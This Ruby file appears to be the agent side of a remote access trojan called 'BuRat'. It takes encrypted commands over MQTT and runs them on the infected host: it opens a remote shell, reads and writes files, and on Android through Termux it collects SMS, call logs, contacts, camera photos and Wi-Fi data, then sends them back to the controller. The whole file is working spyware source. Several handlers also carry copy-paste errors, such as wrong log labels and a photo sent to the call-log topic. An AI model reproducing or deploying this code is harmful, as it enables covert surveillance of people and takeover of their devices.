require_relative 'burat'

burat = BuRat.new([
	:remoteshell,
	:filerw,
	:termux
])

params = {}
burat.internals[:optparse].program_name = "bushi"
burat.internals[:optparse].version = "0.1.1"
burat.internals[:optparse].on('-h', '--help', 'display help')
burat.internals[:optparse].parse!(into: params)

burat.internals[:rsa].config({
:encoded_key => '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3UEh+HOkcBDCuJYRNgRb
GPRUCWZJp4PI2+X21AHPrK7EZ49eH2SNaKm6qivTzcv/+AQxNYzBZVU1AFKqSmKT
pueIIK6qEuh5GTnYsYiTXhNDdNLCFfXLDsc/adEAylSJg7NrBTf9NvanqcSPl/kC
ARNKGkusuh560tVI8NHIsPjwuN3oC49xbFSiyJfaoGa3RJijsMIgPM5zgS2DyJWH
6DxgX7/TbmXUVFkyPyfYhAizsuZijosmSI7SWIbQ7NaiJWdkiFp5lDRIjI5chHnY
CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
5QIDAQAB
-----END PUBLIC KEY-----'
})

burat.internals[:digest].config({
	:digest => 'md5'
})

burat.internals[:aes].config({
	:key_length => 128,
	:mode => :CTR
})

burat.add_topics({
	:nil															=> "bu/nil",
	:bushi														=> "bu/bushi/BURAT",
	:remoteshell											=> "bu/bushi/BURAT/bushido/remoteshell/+",
	:remoteshell_cmd_open							=> "bu/bushi/BURAT/bushido/remoteshell/+/cmd/open",
	:remoteshell_cmd_close						=> "bu/bushi/BURAT/bushido/remoteshell/+/cmd/close",
	:remoteshell_cmd_write						=> "bu/bushi/BURAT/bushido/remoteshell/+/cmd/write",
	:remoteshell_evt_read							=> "bu/bushi/BURAT/bushido/remoteshell/+/evt/read",
	:remoteshell_evt_write						=> "bu/bushi/BURAT/bushido/remoteshell/+/evt/write",
	:remoteshell_evt_error						=> "bu/bushi/BURAT/bushido/remoteshell/+/evt/error",
	:filerw														=> "bu/bushi/BURAT/bushido/filerw/+",
	:filerw_cmd_open									=> "bu/bushi/BURAT/bushido/filerw/+/cmd/open",
	:filerw_cmd_close									=> "bu/bushi/BURAT/bushido/filerw/+/cmd/close",
	:filerw_cmd_read									=> "bu/bushi/BURAT/bushido/filerw/+/cmd/read",
	:filerw_cmd_write									=> "bu/bushi/BURAT/bushido/filerw/+/cmd/write",
	:filerw_evt_read									=> "bu/bushi/BURAT/bushido/filerw/+/evt/read",
	:filerw_evt_write									=> "bu/bushi/BURAT/bushido/filerw/+/evt/write",
	:filerw_evt_error									=> "bu/bushi/BURAT/bushido/filerw/+/evt/error",
	:termux														=> "bu/bushi/BURAT/bushido/termux/+",
	:termux_cmd_open									=> "bu/bushi/BURAT/bushido/termux/+/cmd/open",
	:termux_cmd_close									=> "bu/bushi/BURAT/bushido/termux/+/cmd/close",
	:termux_cmd_audio_info						=> "bu/bushi/BURAT/bushido/termux/+/cmd/audio_info",
	:termux_cmd_battery_status				=> "bu/bushi/BURAT/bushido/termux/+/cmd/battery_status",
	:termux_cmd_call_log							=> "bu/bushi/BURAT/bushido/termux/+/cmd/call_log",
	:termux_cmd_camera_info						=> "bu/bushi/BURAT/bushido/termux/+/cmd/camera_info",
	:termux_cmd_camera_photo					=> "bu/bushi/BURAT/bushido/termux/+/cmd/camera_photo",
	:termux_cmd_contact_list					=> "bu/bushi/BURAT/bushido/termux/+/cmd/contact_list",
	:termux_cmd_sms_list							=> "bu/bushi/BURAT/bushido/termux/+/cmd/sms_list",
	:termux_cmd_device_info						=> "bu/bushi/BURAT/bushido/termux/+/cmd/device_info",
	:termux_cmd_wifi_connection_info	=> "bu/bushi/BURAT/bushido/termux/+/cmd/wifi_connection_info",
	:termux_cmd_wifi_scan_info				=> "bu/bushi/BURAT/bushido/termux/+/cmd/wifi_scan_info",
	:termux_evt_audio_info						=> "bu/bushi/BURAT/bushido/termux/+/evt/audio_info",
	:termux_evt_battery_status				=> "bu/bushi/BURAT/bushido/termux/+/evt/battery_status",
	:termux_evt_call_log							=> "bu/bushi/BURAT/bushido/termux/+/evt/call_log",
	:termux_evt_camera_info						=> "bu/bushi/BURAT/bushido/termux/+/evt/camera_info",
	:termux_evt_camera_photo					=> "bu/bushi/BURAT/bushido/termux/+/evt/camera_photo",
	:termux_evt_contact_list					=> "bu/bushi/BURAT/bushido/termux/+/evt/contact_list",
	:termux_evt_sms_list							=> "bu/bushi/BURAT/bushido/termux/+/evt/sms_list",
	:termux_evt_device_info						=> "bu/bushi/BURAT/bushido/termux/+/evt/device_info",
	:termux_evt_wifi_connection_info	=> "bu/bushi/BURAT/bushido/termux/+/evt/wifi_connection_info",
	:termux_evt_wifi_scan_info				=> "bu/bushi/BURAT/bushido/termux/+/evt/wifi_scan_info"
})

# remoteshell commands
burat.add_topic_callback(:remoteshell_cmd_open) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:remoteshell].open(packet.id, packet.shell)
end

burat.add_topic_callback(:remoteshell_cmd_close) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:remoteshell].close(packet.id)
end

burat.add_topic_callback(:remoteshell_cmd_write) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:remoteshell].write(packet.id, packet.data)
end

# filerw commands
burat.add_topic_callback(:filerw_cmd_open) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:filerw].open(packet.id, packet.path)
end

burat.add_topic_callback(:filerw_cmd_close) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:filerw].close(packet.id)
end

burat.add_topic_callback(:filerw_cmd_read) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:filerw].read(packet.id, packet.length, packet.offset)
end

burat.add_topic_callback(:filerw_cmd_write) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:filerw].write(packet.id, packet.data, packet.offset)
end

# termux commands
burat.add_topic_callback(:termux_cmd_open) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].open(packet.id)
end

burat.add_topic_callback(:termux_cmd_close) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].close(packet.id)
end

burat.add_topic_callback(:termux_cmd_audio_info) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].audio_info(packet.id)
end

burat.add_topic_callback(:termux_cmd_battery_status) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].battery_status(packet.id)
end

burat.add_topic_callback(:termux_cmd_call_log) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].call_log(packet.id, packet.limit, packet.offset)
end

burat.add_topic_callback(:termux_cmd_camera_info) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].camera_info(packet.id)
end

burat.add_topic_callback(:termux_cmd_camera_photo) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].cmaera_photo(packet.id, packet.camera_id, packet.output_file)
end

burat.add_topic_callback(:termux_cmd_contact_list) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].contact_list(packet.id)
end

burat.add_topic_callback(:termux_cmd_sms_list) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].sms_list(packet.id, packet.limit, packet.offset, packet.type)
end

burat.add_topic_callback(:termux_cmd_device_info) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].device_info(packet.id)
end

burat.add_topic_callback(:termux_cmd_wifi_connection_info) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].wifi_connection_info(packet.id)
end

burat.add_topic_callback(:termux_cmd_wifi_scan_info) do |message|
	packet = burat.decryse(message.payload)
	burat.bushido[:termux].wifi_scan_info(packet.id)
end

# remoteshell events
burat.bushido[:remoteshell].on :open do |id|
  puts "remoteshell.open #{id}"
	remoteshell = burat.bushido[:remoteshell].remoteshells.find { |remoteshell| remoteshell.id == id }
	packet = { :id => id, :shell => remoteshell.shell }
	packet = burat.seen(packet)
	burat.publish(id, :remoteshell, packet, true, 2)
end

burat.bushido[:remoteshell].on :close do |id|
	puts "remoteshell.close #{id}"
	burat.publish(id, :remoteshell, nil, true, 2)
end

burat.bushido[:remoteshell].on :read do |id, data|
  puts "remoteshell.read #{id} #{data}"
	packet = { :id => id, :data	=> data }
	packet = burat.seen(packet)
	burat.publish(id, :remoteshell_evt_read, packet, false, 2)
end

burat.bushido[:remoteshell].on :write do |id, data|
  puts "remoteshell.write #{id} #{data}"
	packet = { :id => id, :data => data }
	packet = burat.seen(packet)
	burat.publish(id, :remoteshell_evt_write, packet, false, 2)
end

burat.bushido[:remoteshell].on :error do |id, error|
  puts "remoteshell.error #{id} #{error}"
	packet = { :id => id, :error	=> error }
	packet = burat.seen(packet)
	burat.publish(id, :remoteshell_evt_error, packet, false, 2)
end

# filerw events
burat.bushido[:filerw].on :open do |id|
  puts "filerw.open #{id}"
	file = burat.bushido[:filerw].files.find { |file| file.id == id }
	packet = {
		:id				=> id,
		:path			=> file.path
	}
	packet = burat.seen(packet)
	burat.publish(id, :filerw, packet, true, 2)
end

burat.bushido[:filerw].on :close do |id|
	puts "filerw.close #{id}"
	burat.publish(id, :filerw, nil, true, 2)
end

burat.bushido[:filerw].on :read do |id, data, offset|
	puts "filerw.read #{id} #{data}"
	packet = { :id => id, :data	=> data, :offset => offset }
	packet = burat.seen(packet)
	burat.publish(id, :filerw_evt_read, packet, false, 2)
end

burat.bushido[:filerw].on :write do |id, length, offset|
  puts "filerw.write #{id} #{length}"
	packet = { :id => id,	:length	=> length, :offset => offset }
	packet = burat.seen(packet)
	burat.publish(id, :filerw_evt_write, packet, false, 2)
end

burat.bushido[:filerw].on :error do |id, error|
  puts "filerw.error #{id} #{error}"
	packet = { :id => id, :error => error	}
	packet = burat.seen(packet)
	burat.publish(id, :filerw_evt_error, packet, false, 2)
end

# termux events
burat.bushido[:termux].on :open do |id|
  puts "termux.open #{id}"
	packet = id
	packet = burat.seen(packet)
	burat.publish(id, :termux, packet, true, 2)
end

burat.bushido[:termux].on :close do |id|
  puts "termux.close #{id}"
	burat.publish(id, :termux, nil, true, 2)
end

burat.bushido[:termux].on :audio_info do |id, data|
  puts "termux.audio_info #{id}"
	packet = { :id => id, :data => data}
	packet = burat.seen(packet)
	burat.publish(id, :termux_evt_audio_info, packet, false, 2)
end

burat.bushido[:termux].on :battery_status do |id, data|
  puts "termux.audio_info #{id}"
	packet = { :id => id, :data => data}
	packet = burat.seen(packet)
	burat.publish(id, :termux_evt_battery_status, packet, false, 2)
end

burat.bushido[:termux].on :call_log do |id, data|
  puts "termux.audio_info #{id}"
	packet = { :id => id, :data => data}
	packet = burat.seen(packet)
	burat.publish(id, :termux_evt_call_log, packet, false, 2)
end

burat.bushido[:termux].on :camera_info do |id, data|
  puts "termux.audio_info #{id}"
	packet = { :id => id, :data => data}
	packet = burat.seen(packet)
	burat.publish(id, :termux_evt_camera_info, packet, false, 2)
end

burat.bushido[:termux].on :camera_photo do |id, data|
  puts "termux.audio_info #{id}"
	packet = { :id => id, :data => data}
	packet = burat.seen(packet)
	burat.publish(id, :termux_evt_call_log, packet, false, 2)
end

burat.bushido[:termux].on :contact_list do |id, data|
  puts "termux.audio_info #{id}"
	packet = { :id => id, :data => data}
	packet = burat.seen(packet)
	burat.publish(id, :termux_evt_contact_list, packet, false, 2)
end

burat.bushido[:termux].on :sms_list do |id, data|
  puts "termux.audio_info #{id}"
	packet = { :id => id, :data => data}
	packet = burat.seen(packet)
	burat.publish(id, :termux_evt_sms_list, packet, false, 2)
end

burat.bushido[:termux].on :device_info do |id, data|
  puts "termux.audio_info #{id}"
	packet = { :id => id, :data => data}
	packet = burat.seen(packet)
	burat.publish(id, :termux_evt_device_info, packet, false, 2)
end

burat.bushido[:termux].on :wifi_connection_info do |id, data|
  puts "termux.audio_info #{id}"
	packet = { :id => id, :data => data}
	packet = burat.seen(packet)
	burat.publish(id, :termux_evt_wifi_connection_info, packet, false, 2)
end

burat.bushido[:termux].on :wifi_scan_info do |id, data|
  puts "termux.audio_info #{id}"
	packet = { :id => id, :data => data}
	packet = burat.seen(packet)
	burat.publish(id, :termux_evt_wifi_scan_info, packet, false, 2)
end

# others
burat.add_topic_callback(:remoteshell) do |message|
	if message.payload != '' then
		begin
			packet = burat.decryse(message.payload)
		rescue StandardError => error
			burat.internals[:mqtt].publish(message.topic, nil, true, 2)
		end
	end
end

burat.add_topic_callback(:filerw) do |message|
	if message.payload != '' then
		begin
			packet = burat.decryse(message.payload)
		rescue StandardError => error
			burat.internals[:mqtt].publish(message.topic, nil, true, 2)
		end
	end
end

last_ping_time = Time.now
loop do
	begin
		if burat.internals[:mqtt].connected? then
			burat.internals[:mqtt].mqtt_loop
			if last_ping_time <= Time.now - burat.internals[:mqtt].keep_alive then
				burat.ping
				last_ping_time = Time.now
			end
		else
			burat.connect() if !burat.connecting?
		end
	rescue StandardError => error
		puts error.full_message
			burat.connect() if !burat.connecting?
	end
end
